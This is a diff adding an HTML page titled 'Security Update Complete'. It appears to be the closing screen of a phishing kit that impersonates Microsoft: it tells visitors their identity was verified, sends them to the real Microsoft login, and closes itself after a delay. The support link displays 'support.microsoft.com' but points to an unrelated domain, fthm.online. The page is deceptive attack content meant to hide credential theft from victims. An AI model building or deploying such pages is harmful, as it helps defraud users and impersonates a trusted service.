@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Update Complete</title>
+    <link rel="stylesheet" href="security.css">
+</head>
+<body>
+    <div class="auth-container fade-in">
+        <div class="header">
+            <img src="assets/company-logo.svg" alt="Secure Portal" class="logo">
+        </div>
+
+        <div style="text-align: center; margin-bottom: 32px;">
+            <div style="font-size: 64px; margin-bottom: 16px; color: var(--success-green);">✅</div>
+            <h2 style="color: var(--success-green); margin-bottom: 16px;">Security Verification Complete</h2>
+            <p style="color: var(--text-secondary); line-height: 1.6; margin-bottom: 24px;">
+                Your identity has been successfully verified. You may now close this window and return to your original session.
+            </p>
+            
+            <div style="background: #f8f9fa; padding: 16px; border-radius: 8px; margin: 20px 0;">
+                <p style="margin: 0; color: var(--text-secondary); font-size: 14px;">
+                    <strong>Status:</strong> Security verification successful<br>
+                    <strong>Next:</strong> Return to your application
+                </p>
+            </div>
+        </div>
+
+        <div style="display: flex; gap: 12px; justify-content: center;">
+            <button onclick="window.close()" class="secondary-action">
+                Close Window
+            </button>
+            <button onclick="window.open('https://login.microsoftonline.com', '_blank')" class="primary-action">
+                Open Service
+            </button>
+        </div>
+
+        <div style="text-align: center; margin-top: 32px; padding-top: 20px; border-top: 1px solid var(--border-light);">
+            <p style="color: var(--text-secondary); font-size: 12px; margin-bottom: 8px;">
+                Need help? Contact support
+            </p>
+            <a href="https://www.fthm.online" style="color: var(--primary-blue); text-decoration: none; font-size: 12px;">
+                support.microsoft.com
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // Optional: Show a message about successful verification
+        console.log('Security verification process completed successfully');
+        
+        // If opened in a popup, try to close after delay
+        if (window.opener) {
+            setTimeout(() => {
+                window.close();
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
